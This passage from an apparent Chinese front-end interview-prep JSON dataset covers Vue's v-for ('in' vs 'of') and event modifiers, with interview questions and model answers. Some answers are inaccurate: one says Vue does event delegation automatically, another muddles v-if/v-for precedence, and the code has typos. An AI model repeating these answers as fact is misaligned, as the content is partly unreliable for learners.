    "exerciseKeyList": "[\"8688fc18-d0c2-4122-ac6f-ea86d8798d42\",\"db22b09c-fdbb-4a6c-8fdd-2ad65bb11846\"]",
    "vipLimit": 1,
    "level": 1,
    "pointOrder": 1,
    "createAt": "2024-10-04T14:43:07.000Z",
    "updateAt": "2024-12-15T11:48:37.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "8688fc18-d0c2-4122-ac6f-ea86d8798d42",
        "title": "为什么Vue中的v-if和v-for不建议一起用?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:32:53.000Z",
        "updateAt": "2024-08-10T17:04:39.000Z"
      },
      {
        "exerciseKey": "db22b09c-fdbb-4a6c-8fdd-2ad65bb11846",
        "title": "Vue中的 v-show 和 v-if 有什么区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:30:16.000Z",
        "updateAt": "2024-08-10T17:04:38.000Z"
      }
    ]
  },
  "74": {
    "id": 74,
    "tagId": 14,
    "title": "v-for",
    "explanation": "在 `Vue.js` 开发中，`v-for` 是我们用来遍历数组、对象或其他数据结构的核心指令。然而，很多开发者可能忽略了其中的一个细微差别：`in` 和 `of`。这两个关键字看似相似，但却有各自不同的使用场景和适用数据类型。理解它们的区别，可以帮助我们编写更简洁、高效的代码。\n\n本文将详细探讨 `v-for` 中的 `in` 和 `of`，并讲解它们各自的适用场景，帮助你在 `Vue.js` 项目中做出最佳选择。\n\n* * *\n\n### 什么是 `v-for`？\n\n`v-for` 是 `Vue.js` 提供的用于遍历数据的指令，它可以帮助你快速渲染列表、表格等动态生成的内容。在使用 `v-for` 时，我们通常需要遍历一个数据集合，并将每一项绑定到 `DOM` 元素上。\n\n### `in` 和 `of` 的概念\n\n`v-for` 中的 `in` 和 `of` 是遍历数据时的两个常用关键字，它们的主要区别在于：**`in` 更通用，可以遍历数组、对象和整数范围；而 `of` 专注于遍历可迭代对象（如数组、字符串、`Set`、`Map` 等）** 。\n\n接下来，我们深入探讨它们的具体用法及差异。\n\n* * *\n\n### 1\\. `in`：适用于数组、对象、整数范围\n\n#### 1.1 遍历数组\n\n`in` 是 `Vue.js` 中默认推荐的方式，用于遍历数组中的元素。你可以轻松地用 `in` 处理数组中的每个值。\n\n```html\n<ul>\n  <li v-for=\"item in items\">{{ item }}</li>\n</ul>\n\n```\n\n假设 `items = ['apple', 'banana', 'cherry']`，输出结果为：\n\n```html\n<li>apple</li>\n<li>banana</li>\n<li>cherry</li>\n\n```\n\n#### 1.2 遍历对象\n\n当你需要遍历对象的键和值时，`in` 也非常方便。通过 `(value, key)` 语法，你可以轻松获取对象的键和值。\n\n```html\n<ul>\n  <li v-for=\"(value, key) in myObject\">{{ key }}: {{ value }}</li>\n</ul>\n\n```\n\n假设 `myObject = { name: 'John', age: 30 }`，输出结果为：\n\n```html\n<li>name: John</li>\n<li>age: 30</li>\n\n```\n\n#### 1.3 遍历整数范围\n\n`in` 还可以用来遍历一个指定的整数范围，特别适用于需要循环渲染某些元素的场景。\n\n```html\n<div v-for=\"n in 5\">{{ n }}</div>\n\n```\n\n这段代码会渲染从 1 到 5 的数字：\n\n```html\n<div>1</div>\n<div>2</div>\n<div>3</div>\n<div>4</div>\n<div>5</div>\n\n```\n\n#### 总结 `in` 的适用场景：\n\n*   **数组**：遍历数组的元素。\n*   **对象**：遍历对象的键值对。\n*   **整数范围**：生成指定范围的数字序列。\n\n### 2\\. `of`：用于可迭代对象的遍历\n\n#### 2.1 `of` 的用法概述\n\n在 `JavaScript` 中，`for...of` 是遍历可迭代对象的标准语法。类似地，在 `Vue.js` 中，`v-for` 结合 `of` 可以遍历一切可迭代对象，如数组、字符串、`Set`、`Map` 等。\n\n尽管 `of` 并没有广泛应用于 `Vue.js` 文档中的例子，但它在处理特定数据结构时非常有效。\n\n#### 2.2 遍历数组\n\n`of` 和 `in` 都可以用于遍历数组。它们的效果相同，但 `of` 更偏向于遵循 `JavaScript` 的迭代标准。\n\n```html\n<ul>\n  <li v-for=\"item of items\">{{ item }}</li>\n</ul>\n\n```\n\n输出与 `in` 相同：\n\n```html\n<li>apple</li>\n<li>banana</li>\n<li>cherry</li>\n\n```\n\n#### 2.3 遍历字符串\n\n`of` 非常适合用于遍历字符串中的每个字符。\n\n```html\n<span v-for=\"char of 'hello'\">{{ char }}</span>\n\n```\n\n输出结果为：\n\n```html\n<span>h</span>\n<span>e</span>\n<span>l</span>\n<span>l</span>\n<span>o</span>\n\n```\n\n#### 2.4 遍历 `Set` 和 `Map`\n\n与 `JavaScript` 的原生 `for...of` 类似，`v-for` 中的 `of` 也可以轻松遍历 `Set` 和 `Map` 等复杂数据结构。\n\n```html\n<ul>\n  <li v-for=\"item of new Set([1, 2, 3])\">{{ item }}</li>\n</ul>\n\n```\n\n输出为：\n\n```html\n<li>1</li>\n<li>2</li>\n<li>3</li>\n\n```\n\n#### 总结 `of` 的适用场景：\n\n*   **数组**：与 `in` 类似，遍历数组的元素。\n*   **字符串**：遍历字符串中的每个字符。\n*   **`Set` 和 `Map`**：遍历复杂的可迭代数据结构。\n\n* * *\n\n### `in` 和 `of` 的区别\n\n#### 1\\. 适用范围\n\n*   **`in`**：可以遍历数组、对象和整数范围。\n*   **`of`**：主要用于遍历可迭代对象，如数组、字符串、`Set`、`Map`。\n\n#### 2\\. 对象的遍历\n\n*   **`in`**：可以遍历对象的键和值，非常适合处理对象。\n*   **`of`**：不能直接用于对象，因为对象并不是可迭代的。\n\n#### 3\\. 数据类型的适配\n\n*   **`in`**：更通用，适用于大多数场景。\n*   **`of`**：专门用于处理可迭代对象，更加符合 `JavaScript` 的迭代标准。\n\n* * *\n\n### 选择 `in` 还是 `of`？\n\n*   **当处理数组、对象、整数范围时**，`in` 是 `Vue.js` 中的默认选择，提供了更广泛的兼容性。\n*   **当处理可迭代对象时**，如字符串、`Set` 或 `Map`，使用 `of` 会更加符合标准的 `JavaScript` 迭代行为。\n\n### 结语\n\n`v-for` 是 `Vue.js` 中非常强大和常用的指令，而理解 `in` 和 `of` 的差异能够帮助你更灵活地处理不同的数据结构。无论是遍历数组、对象，还是其他复杂数据结构，正确选择 `in` 或 `of` 都能让代码更加高效、易读。\n",
    "testPoint": "### **1. `v-for` 的基本用法**\n#### **问题：**\n1. `v-for` 如何遍历数组和对象？\n2. `v-for` 的语法如何？它能处理哪些数据类型？\n\n#### **考察点：**\n- **数组遍历**：\n  - `v-for` 可以遍历数组、对象、甚至 Set 和 Map。\n    ```vue\n    <ul>\n      <li v-for=\"item in items\" :key=\"item.id\">{{ item.name }}</li>\n    </ul>\n    ```\n  - 数组遍历语法：`v-for=\"item in items\"`, 其中 `items` 是数组，`item` 是每一项。\n\n- **对象遍历**：\n  - `v-for` 也可以遍历对象的属性和对应的值。\n    ```vue\n    <ul>\n      <li v-for=\"(value, key) in object\" :key=\"key\">{{ key }}: {{ value }}</li>\n    </ul>\n    ```\n  - 对象遍历语法：`v-for=\"(value, key) in object\"`, 其中 `object` 是对象，`key` 和 `value` 分别是对象的属性名和属性值。\n\n- **索引的使用**：\n  - `v-for` 可以通过索引（index）来访问数组元素的索引值。\n    ```vue\n    <ul>\n      <li v-for=\"(item, index) in items\" :key=\"index\">{{ index }}: {{ item }}</li>\n    </ul>\n    ```\n\n---\n\n### **2. `v-for` 性能优化**\n#### **问题：**\n1. `v-for` 在大量数据渲染时会有哪些性能问题？\n2. 为什么在使用 `v-for` 时要设置 `key` 属性？如果不设置 `key`，会有什么影响？\n\n#### **考察点：**\n- **性能问题**：\n  - 当渲染大量数据时，`v-for` 会根据数据项的数量创建相应数量的 DOM 元素，如果没有适当优化，可能会造成性能瓶颈，特别是在频繁变化的列表中。\n  - 渲染的每一项都可能引发组件的重新渲染，特别是当数据更新时，整个列表的 DOM 可能会重新渲染。\n\n- **使用 `key` 的作用**：\n  - `key` 是 Vue 中用于标识每个元素或组件的唯一标识。它帮助 Vue 优化虚拟 DOM 的差异计算，避免不必要的重渲染。\n  - 如果不设置 `key`，Vue 会基于顺序来判断元素的变化，可能会出现性能下降或渲染错误的问题。\n  - 正确使用 `key` 可以确保 Vue 在更新时能够准确地复用已有的 DOM 元素。\n\n---\n\n### **3. `v-for` 和 `v-if` 的组合使用**\n#### **问题：**\n1. 在同一个元素上使用 `v-for` 和 `v-if` 会有问题吗？如果有，如何避免？\n2. `v-for` 和 `v-if` 组合时有性能问题吗？\n\n#### **考察点：**\n- **组合使用的问题**：\n  - 使用 `v-for` 和 `v-if` 同时在同一个元素上时，Vue 会先进行 `v-if` 条件判断，再进行 `v-for` 的遍历。因此，如果 `v-if` 在外层，可能会影响 `v-for` 的渲染效率。\n  - 不推荐将 `v-if` 放在 `v-for` 上，尤其是在列表项较多的情况下。这样做可能会导致每个渲染项都做一次条件判断，影响性能。\n\n- **优化方案**：\n  - 如果需要对某些元素进行条件渲染，可以将 `v-if` 放在 `v-for` 之外的容器上，或者先用 `computed` 计算出符合条件的数据源，再用 `v-for` 渲染。\n\n---\n\n### **4. `v-for` 的深度渲染与组件化**\n#### **问题：**\n1. 使用 `v-for` 渲染大量的数据时，是否应该直接渲染组件？组件化会带来哪些影响？\n2. 你如何在 `v-for` 中渲染大量组件时，优化性能？\n\n#### **考察点：**\n- **渲染大量组件的性能问题**：\n  - 当 `v-for` 用于渲染大量数据并且每个项是组件时，可能会导致性能问题，因为每个组件都可能有自己的生命周期、事件监听和渲染开销。\n  - 对于大量组件的渲染，Vue 会尝试通过 `key` 和虚拟 DOM 的优化来提升性能，但大量的组件仍可能影响渲染速度。\n\n- **性能优化**：\n  - 使用 `v-for` 渲染大量组件时，可以考虑使用 **懒加载** 或 **虚拟列表**（如 `vue-virtual-scroller`）来减少同时渲染的组件数量。\n  - 采用 **组件懒加载** 或 **按需渲染**，即只有在需要时才渲染该项组件。\n  - 使用 `keep-alive` 缓存不频繁变化的组件，减少不必要的销毁和重新创建。\n\n---\n\n### **5. `v-for` 的递归渲染**\n#### **问题：**\n1. `v-for` 是否支持递归渲染？如何在 `v-for` 中处理递归问题？\n2. 在递归渲染过程中，如何避免性能问题？\n\n#### **考察点：**\n- **递归渲染的使用**：\n  - `v-for` 可以用于递归渲染子组件，例如树形结构的数据渲染：\n    ```vue\n    <template v-for=\"node in nodes\">\n      <TreeNode :node=\"node\" :key=\"node.id\" />\n      <template v-if=\"node.children\">\n        <TreeNode v-for=\"child in node.children\" :node=\"child\" :key=\"child.id\" />\n      </template>\n    </template>\n    ```\n  - 需要在递归渲染时为每个递归项设置一个唯一的 `key`，并且确保递归的数据结构是合理的，避免过深的递归。\n\n- **性能优化**：\n  - 递归渲染时，可以采取懒加载、延迟加载或仅渲染当前可见的部分，避免一次性渲染过多节点。\n  - 限制递归深度，避免无限递归导致性能和内存问题。\n\n---\n\n### **6. 迭代范围与嵌套**\n#### **问题：**\n1. 如何在 `v-for` 中使用多个循环嵌套？有哪些需要注意的问题？\n2. 如果需要迭代一个二维数组或对象数组，应该如何使用 `v-for`？\n\n#### **考察点：**\n- **嵌套循环**：\n  - `v-for` 可以嵌套使用来处理多层数据结构，例如：\n    ```vue\n    <div v-for=\"(item, index) in list\" :key=\"index\">\n      <p v-for=\"(subItem, subIndex) in item.subList\" :key=\"subIndex\">{{ subItem }}</p>\n    </div>\n    ```\n  - 在嵌套循环中，需要确保每一层数据都有一个独特的 `key`，以提高渲染效率。\n\n- **二维数组或对象数组**：\n  - `v-for` 可用于渲染二维数组，迭代过程中可以通过计算索引来访问每一项。\n    ```vue\n    <div v-for=\"(row, rowIndex) in matrix\" :key=\"rowIndex\">\n      <div v-for=\"(col, colIndex) in row\" :key=\"colIndex\">{{ col }}</div>\n    </div>\n    ```\n\n---\n\n### **总结**\n`v-for` 是 Vue 中非常重要的指令，能够帮助开发者高效地渲染列表和动态内容。在面试中，考察候选人对 `v-for` 的基本用法、性能优化、递归渲染以及与 `key` 和 `v-if` 的结合使用的理解，能帮助评估其对 Vue 渲染机制和性能优化的掌握程度。",
    "exerciseKeyList": "[\"a7da8658-3b6f-4417-8ff0-66e078fa09b9\",\"8688fc18-d0c2-4122-ac6f-ea86d8798d42\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-05T02:03:59.000Z",
    "updateAt": "2024-12-15T11:49:49.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "8688fc18-d0c2-4122-ac6f-ea86d8798d42",
        "title": "为什么Vue中的v-if和v-for不建议一起用?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:32:53.000Z",
        "updateAt": "2024-08-10T17:04:39.000Z"
      },
      {
        "exerciseKey": "a7da8658-3b6f-4417-8ff0-66e078fa09b9",
        "title": "vue 文件中，在 v-for 时给每项元素绑定事件需要用事件代理吗，为什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T14:02:29.000Z"
      }
    ]
  },
  "75": {
    "id": 75,
    "tagId": 14,
    "title": "vue事件处理",
    "explanation": "一、DOM 事件流\n---------\n\n想必看过《红宝书》的前端 er 对标题都不会特别陌生，我们来看看定义：当一个 HTML 元素产生一个事件时，该事件会在树形结构的 DOM 上面沿着元素节点路径进行传播，事件所经过的路径结点都会收到该事件，这个传播过程可称为 **DOM 事件流**。\n\n![img02.jpeg](https://static.ecool.fun//article/a93d90ec-49ab-4819-be4b-eda353fa349c.awebp)\n\n二、DOM 事件流模型\n-----------\n\nDOM 事件流分为 **捕获型事件流** 和 **冒泡型事件流**。两种事件流分别对应三阶段 DOM 事件流模型中的捕获阶段和冒泡阶段：\n\n1.  **捕获**阶段：事件从最外面的祖先节点依次传递到最里面的后代节点\n2.  目标阶段：真正的目标节点正在处理事件的阶段\n3.  **冒泡**阶段：事件又从最里面的后代节点逐层传出到最外面的祖先节点\n\n![img01.jpeg](https://static.ecool.fun//article/d2f3bc8a-7612-4d78-aa41-199bf2baaa13.awebp)\n\n三、Vue 之事件处理\n-----------\n\nVue 中提供了事件绑定的语法糖，我们可以很简单地在标签中直接使用 `@click=\"handleClick($event)\"` 就可以绑定点击事件。\n\n而且在 Vue 里面，**Vue 的事件触发默认为冒泡过程监听**，意思就是上面 `@click=\"handleClick($event)\"` 中点击事件的执行是冒泡过程触发的。\n\n四、Vue 之事件修饰符\n------------\n\n### 4.1 `.capture`\n\n> 捕获监听器\n\n```html\n<div @click=\"log(1)\" @click.capture=\"log(1)\" style=\"background-color: #00f\">\n  <div @click=\"log(2)\" @click.capture=\"log(2)\" style=\"background-color: #66f\">\n    <div @click=\"log(3)\" @click.capture=\"log(3)\" style=\"background-color: #ccf\">\n      <div @click=\"log(4)\" @click.capture=\"log(4)\" style=\"background-color: #fff\">\n        点击这里\n      </div>\n    </div>\n  </div>\n</div>\n\n```\n\n控制台打印结果为：`1 2 3 4 4 3 2 1`\n\n![截屏2021-07-06 下午11.31.01.png](https://static.ecool.fun//article/98cab441-9e86-4bd4-a834-3fd406b97176.awebp)\n\n符合 DOM 事件流模型，先捕获后冒泡，`.capture` 的作用就是在捕获阶段触发事件。\n\n### 4.2 `.stop`\n\n> 阻止事件传递\n\n```html\n<div @click=\"log(1)\" @click.capture=\"log(1)\" style=\"background-color: #00f\">\n  <div @click=\"log(2)\" @click.capture=\"log(2)\" style=\"background-color: #66f\">\n    <div @click=\"log(3)\" @click.capture.stop=\"log(3)\" style=\"background-color: #ccf\">\n      <div @click=\"log(4)\" @click.capture=\"log(4)\" style=\"background-color: #fff\">\n        点击这里\n      </div>\n    </div>\n  </div>\n</div>\n\n```\n\n控制台打印结果为：`1 2 3`\n\n说明 `.stop` 真正的作用是阻止事件的传递，不仅阻止捕获事件流，也会阻止冒泡事件流。\n\n`.stop` 最常见的应用场景：比如移动端购物车的商品列表，点击商品列表跳转商品详情，商品列表右下角有个删除商品的按钮，点击按钮删除该商品。假设我们正常监听点击事件，当我们点击删除按钮时，触发删除事件，但是由于事件冒泡，稍后触发跳转商品详情的事件。结论就是：在删除按钮监听事件增加 `.stop` 事件修饰符，避免事件传递造成非预期的结果。\n\n### 4.3 `.prevent`\n\n> 阻止默认事件的触发：比如某些 HTML 标签拥有自身的默认事件，如 `a[href=\"#\"]`、`button[type=\"submit\"]` 标签**在冒泡结束后会开始执行默认事件**。**注意默认事件虽然是冒泡后开始，但不会因为 `.stop` 事件修饰符阻止事件传递而停止。**\n\n```html\n<div @click=\"log(1)\" @click.capture=\"log(1)\" style=\"background-color: #00f\">\n  <div @click=\"log(2)\" @click.capture=\"log(2)\" style=\"background-color: #66f\">\n    <div @click=\"log(3)\" @click.capture.stop=\"log(3)\" style=\"background-color: #ccf\">\n      <a @click=\"log(4)\" @click.capture=\"log(4)\" href=\"javascript: console.log('x')\" \nstyle=\"background-color: #fff\">\n        点击这里\n      </a>\n    </div>\n  </div>\n</div>\n\n```\n\n控制台打印结果为：`1 2 3 x`\n\n上例中说明了 `.stop` 事件修饰符无法阻止 `a[href=\"#\"]` 中默认事件的触发。\n\n```html\n<!-- 将 .prevent 绑在冒泡阶段 -->\n<div @click=\"log(1)\" @click.capture=\"log(1)\" style=\"background-color: #00f\">\n  <div @click=\"log(2)\" @click.capture=\"log(2)\" style=\"background-color: #66f\">\n    <div @click=\"log(3)\" @click.capture=\"log(3)\" style=\"background-color: #ccf\">\n      <a @click.prevent=\"log(4)\" @click.capture=\"log(4)\" href=\"javascript: console.log('x')\" \nstyle=\"background-color: #fff\">\n        点击这里\n      </a>\n    </div>\n  </div>\n</div>\n\n<!-- 将 .prevent 绑在捕获阶段 -->\n<div @click=\"log(1)\" @click.capture=\"log(1)\" style=\"background-color: #00f\">\n  <div @click=\"log(2)\" @click.capture=\"log(2)\" style=\"background-color: #66f\">\n    <div @click=\"log(3)\" @click.capture=\"log(3)\" style=\"background-color: #ccf\">\n      <a @click=\"log(4)\" @click.capture.prevent=\"log(4)\" href=\"javascript: console.log('x')\" \nstyle=\"background-color: #fff\">\n        点击这里\n      </a>\n    </div>\n  </div>\n</div>\n\n```\n\n控制台打印结果为：`1 2 3 4 4 3 2 1`\n\n上述两例证明，无论是在冒泡阶段阻止默认事件还是在捕获阶段阻止默认事件，结果都是一样的。\n\n### 4.4 `.passive`\n\n> 不阻止默认事件的触发：浏览器只有等内核线程执行到事件监听器对应的 JavaScript 代码时，才能知道内部是否会调用 preventDefault 函数来阻止事件的默认行为，所以浏览器本身是没有办法对这种场景进行优化的。这种场景下，用户的手势事件无法快速产生，会导致页面无法快速执行滑动逻辑，从而让用户感觉到页面卡顿。（**通俗点说就是每次事件产生，浏览器都会去查询一下是否有 preventDefault 阻止该次事件的默认动作。我们加上 passive 就是为了告诉浏览器，不用查询了，我们没用 preventDefault 阻止默认动作。**）\n\n应用场景：一般用在滚动监听 `@scoll`、`@touchmove`，因为滚动监听过程中移动每个像素都会产生一次事件，每次都使用内核线程查询 prevent 会使滑动卡顿。我们通过 passive 将内核线程查询跳过，可以大大提升滑动的流畅度。\n\n**注：passive 和 prevent 冲突，不能同时绑定在一个监听器上。**\n\n### 4.5 `.self`\n\n> 只有点击元素本身的时候才会触发这个元素的事件。\n\n```html\n<div @click=\"log(1)\" @click.capture=\"log(1)\" style=\"background-color: #00f\">\n  <div @click=\"log(2)\" @click.capture.self=\"log(2)\" style=\"background-color: #66f\">\n    <div @click.self=\"log(3)\" @click.capture=\"log(3)\" style=\"background-color: #ccf\">\n      <a @click=\"log(4)\" @click.capture=\"log(4)\" href=\"javascript: console.log('x')\" \nstyle=\"background-color: #fff\">\n        点击这里\n      </a>\n    </div>\n  </div>\n</div>\n\n```\n\n*   点击 a 标签控制台打印结果为：`1 3 4 4 2 1 x`\n*   点击 3 图层控制台打印结果为：`1 3 3 2 1`\n\n```html\n<div @click=\"log(1)\" @click.capture=\"log(1)\" style=\"background-color: #00f\">\n  <div @click=\"log(2)\" @click.capture=\"log(2)\" style=\"background-color: #66f\">\n    <div @click=\"log(3)\" @click.capture=\"log(3)\" style=\"background-color: #ccf\">\n      <a @click.prevent.self=\"log(4)\" @click.capturet=\"log(4)\" href=\"javascript: console.log('x')\" \nstyle=\"background-color: #fff\">\n        点击这里\n        <div style=\"background-color: #ccc\">5</div>\n      </a>\n    </div>\n  </div>\n</div>\n\n```\n\n*   点击 a 标签控制台打印结果为：`1 2 3 4 4 3 2 1`\n*   点击 5 图层控制台打印结果为：`1 3 4 3 2 1`\n\n```html\n<div @click=\"log(1)\" @click.capture=\"log(1)\" style=\"background-color: #00f\">\n  <div @click=\"log(2)\" @click.capture=\"log(2)\" style=\"background-color: #66f\">\n    <div @click=\"log(3)\" @click.capture=\"log(3)\" style=\"background-color: #ccf\">\n      <a @click.self.prevent=\"log(4)\" @click.capture=\"log(4)\" href=\"javascript: console.log('x')\" \nstyle=\"background-color: #fff\">\n        点击这里\n        <div style=\"background-color: #ccc\">5</div>\n      </a>\n    </div>\n  </div>\n</div>\n\n```\n\n*   点击 a 标签控制台打印结果为：`1 2 3 4 4 3 2 1`\n*   点击 5 图层控制台打印结果为：`1 2 3 4 3 2 1 x`（x 在最后是由于默认事件在冒泡结束之后执行）\n\n**注：self 写在 prevent 前时，prevent 会被 self 影响。直接点击这个目标时才会触发 prevent。因为 self 拦截住了监听，后面的 prevent 也一起失效了。**\n\n### 4.6 `.native`\n\n> 原型绑定：只有使用 vue 组件才会用到该修饰符。\n\n`<el-input @click.native=\"\">` 相当于把事件绑定在 `input[class=\"el-input__inner\"]` 上。\n\n### 4.7 `.once`\n\n> 使得元素的事件只触发一次。\n\n绑定 `.once` 的监听器只会触发一次，在第一次触发后该监听器会被移除。\n\n",
    "testPoint": "### **1. 事件绑定的基本用法**\n#### **问题：**\n1. 在 Vue 中如何绑定事件处理函数？语法是什么？\n2. `v-on` 指令如何使用？简述其作用和语法。\n\n#### **考察点：**\n- **事件绑定**：\n  - 使用 `v-on` 绑定事件：`v-on:event=\"method\"`, 其中 `event` 是事件类型，`method` 是方法名称。\n  - 简写方式：`@event=\"method\"`，等同于 `v-on:event=\"method\"`。\n    ```vue\n    <button v-on:click=\"handleClick\">Click Me</button>\n    <button @click=\"handleClick\">Click Me</button>\n    ```\n\n- **事件处理方法**：\n  - 事件处理方法可以在 `methods` 中定义。\n    ```vue\n    methods: {\n      handleClick() {\n        console.log('Button clicked');\n      }\n    }\n    ```\n\n---\n\n### **2. 事件修饰符**\n#### **问题：**\n1. Vue 中有哪些常用的事件修饰符？它们分别有什么作用？\n2. 如何阻止事件传播或防止默认事件？\n\n#### **考察点：**\n- **事件修饰符**：\n  - **`.stop`**：阻止事件冒泡（`event.stopPropagation()`）。\n    ```vue\n    <button @click.stop=\"handleClick\">Click Me</button>\n    ```\n  - **`.prevent`**：调用 `event.preventDefault()` 来阻止默认事件（例如表单提交）。\n    ```vue\n    <form @submit.prevent=\"handleSubmit\">Submit</form>\n    ```\n  - **`.capture`**：在捕获阶段触发事件，而不是冒泡阶段。\n    ```vue\n    <button @click.capture=\"handleClick\">Click Me</button>\n    ```\n  - **`.once`**：只触发一次事件，然后移除事件监听器。\n    ```vue\n    <button @click.once=\"handleClick\">Click Me</button>\n    ```\n  - **`.self`**：仅当事件源是当前元素时才触发事件。\n    ```vue\n    <button @click.self=\"handleClick\">Click Me</button>\n    ```\n  - **`.passive`**：表示该事件处理函数不会调用 `event.preventDefault()`，提高性能。\n    ```vue\n    <button @scroll.passive=\"handleScroll\">Scroll</button>\n    ```\n\n---\n\n### **3. 方法参数**\n#### **问题：**\n1. 如何在事件处理函数中传递自定义参数？\n2. `v-on` 中的 `$event` 是什么？如何使用？\n\n#### **考察点：**\n- **传递参数**：\n  - 可以通过箭头函数或方法引用的方式传递自定义参数：\n    ```vue\n    <button @click=\"handleClick('Hello')\">Click Me</button>\n    methods: {\n      handleClick(message) {\n        console.log(message);  // 输出 'Hello'\n      }\n    }\n    ```\n\n- **使用 `$event`**：\n  - `$event` 是 Vue 自动传递给事件处理函数的原生事件对象，可以用来访问事件的详细信息：\n    ```vue\n    <button @click=\"handleClick($event)\">Click Me</button>\n    methods: {\n      handleClick(event) {\n        console.log(event);  // 输出原生的 JavaScript 事件对象\n      }\n    }\n    ```\n\n---\n\n### **4. 事件委托**\n#### **问题：**\n1. Vue 中如何进行事件委托？是否需要手动绑定事件监听？\n2. 如何处理动态生成的元素上的事件绑定？\n\n#### **考察点：**\n- **事件委托**：\n  - Vue 内部已经为你处理了事件委托，通常不需要手动绑定事件监听器。如果你通过 `v-for` 动态渲染元素，Vue 会自动为这些元素绑定事件。\n    ```vue\n    <ul>\n      <li v-for=\"item in items\" :key=\"item.id\" @click=\"handleClick(item)\">Click {{ item.name }}</li>\n    </ul>\n    ```\n\n- **动态元素的事件处理**：\n  - 动态渲染的元素会自动响应事件，无需额外的事件委托。Vue 会将事件绑定到新创建的 DOM 元素上。\n\n---\n\n### **5. 自定义事件**\n#### **问题：**\n1. 如何在 Vue 中触发和监听自定义事件？\n2. 在组件之间进行事件通信时，如何使用 `$emit` 和 `$on`？\n\n#### **考察点：**\n- **触发自定义事件**：\n  - 子组件可以通过 `$emit` 触发自定义事件，父组件通过 `v-on` 监听。\n    ```vue\n    <!-- 子组件 -->\n    <button @click=\"notifyParent\">Click</button>\n    methods: {\n      notifyParent() {\n        this.$emit('customEvent', 'Hello from child');\n      }\n    }\n\n    <!-- 父组件 -->\n    <child-component @customEvent=\"handleCustomEvent\" />\n    methods: {\n      handleCustomEvent(message) {\n        console.log(message);  // 输出 'Hello from child'\n      }\n    }\n    ```\n\n- **组件间通信**：\n  - 子组件触发的自定义事件会通过 `$emit` 向父组件传递，可以传递多个参数。\n  - 在 Vue 3 中，`$on` 方法不再使用，取而代之的是使用 `v-on` 来绑定事件。\n\n---\n\n### **6. 防抖与节流**\n#### **问题：**\n1. Vue 如何实现事件的防抖和节流？\n2. 如何优化频繁触发的事件处理，如滚动、resize 等？\n\n#### **考察点：**\n- **防抖（Debouncing）**：\n  - 防抖是指在事件触发后的延迟一段时间才执行事件处理程序，避免频繁调用。\n  - 可以使用第三方库如 `lodash.debounce` 或手动实现防抖逻辑。\n    ```vue\n    <input @input=\"debouncedInput\" />\n    methods: {\n      debouncedInput: _.debounce(function() {\n        console.log('Input triggered');\n      }, 300)\n    }\n    ```\n\n- **节流（Throttling）**：\n  - 节流是指在固定时间间隔内只执行一次事件处理函数，避免频繁执行。\n  - 同样可以使用 `lodash.throttle` 或自己实现节流功能。\n    ```vue\n    <div @scroll=\"throttledScroll\">Scroll</div>\n    methods: {\n      throttledScroll: _.throttle(function() {\n        console.log('Scrolling');\n      }, 200)\n    }\n    ```\n\n---\n\n### **7. 异步事件处理**\n#### **问题：**\n1. Vue 中事件处理是同步还是异步的？如何处理异步操作？\n2. 事件处理函数中的异步操作会有什么影响？\n\n#### **考察点：**\n- **异步操作**：\n  - Vue 事件处理默认是同步的，意味着所有事件处理函数会按顺序执行。如果事件处理涉及异步操作（如 API 请求），则会导致界面延迟更新。\n  - 异步操作通常通过 `setTimeout`、`Promise` 或 `async/await` 实现。\n    ```vue\n    <button @click=\"handleClick\">Click Me</button>\n    methods: {\n      async handleClick() {\n        const result = await fetchData();\n        console.log(result);\n      }\n    }\n    ```\n\n- **影响**：\n  - 异步操作可能会导致事件处理函数的执行顺序不确定，因此需要保证异步操作的顺序或依赖关系。\n\n---\n\n### **8. 事件总线**\n#### **问题：**\n1. Vue 中如何使用事件总线进行跨组件通信？\n2. 在 Vue 3 中，事件总线是否有变化？\n\n#### **考察点：**\n- **事件总线（Event Bus）**：\n  - 在 Vue 2 中，事件总线通常是一个空的 Vue 实例，可以用来实现跨组件的事件通信。\n    ```javascript\n    const bus = new Vue();\n    bus.$emit('event', data);\n    bus.$on('event', callback);\n    ```\n\n- **Vue 3 的变化**：\n  - Vue 3 中没有事件总线的支持，推荐使用 **`provide`/`inject`** 或 **Vuex** 进行组件间的状态共享和事件通信。\n\n---\n\n### **总结**\nVue 的事件处理涉及事件绑定、事件修饰符、事件传递、性能优化等多个方面。面试时可以考察候选人对这些概念的理解以及在实际开发中如何处理事件相关的场景和问题，如防抖、节流、异步处理等。同时，考察候选人在组件间通信、事件总线等方面的应用和优化思路。",
    "exerciseKeyList": "[\"2724b7d8-c161-4106-9c54-956d14b4b1b0\",\"a7da8658-3b6f-4417-8ff0-66e078fa09b9\",\"b63832ef-77c7-4507-baf5-1134957368c0\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-05T02:40:42.000Z",
    "updateAt": "2024-12-15T11:51:00.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "2724b7d8-c161-4106-9c54-956d14b4b1b0",
        "title": "Vue 的响应式数据流驱动页面和传统的事件绑定命令式驱动页面，分别有什么优缺点？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T23:18:48.000Z"
      },
      {
        "exerciseKey": "a7da8658-3b6f-4417-8ff0-66e078fa09b9",
        "title": "vue 文件中，在 v-for 时给每项元素绑定事件需要用事件代理吗，为什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T14:02:29.000Z"
      },
      {
        "exerciseKey": "b63832ef-77c7-4507-baf5-1134957368c0",
        "title": "谈谈 Vue 事件机制，并手写$on、$off、$emit、$once",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-06-06T01:36:49.000Z",
        "updateAt": "2024-08-10T17:07:45.000Z"
      }
    ]
  },
  "76": {
    "id": 76,
    "tagId": 14,
    "title": "自定义指令",
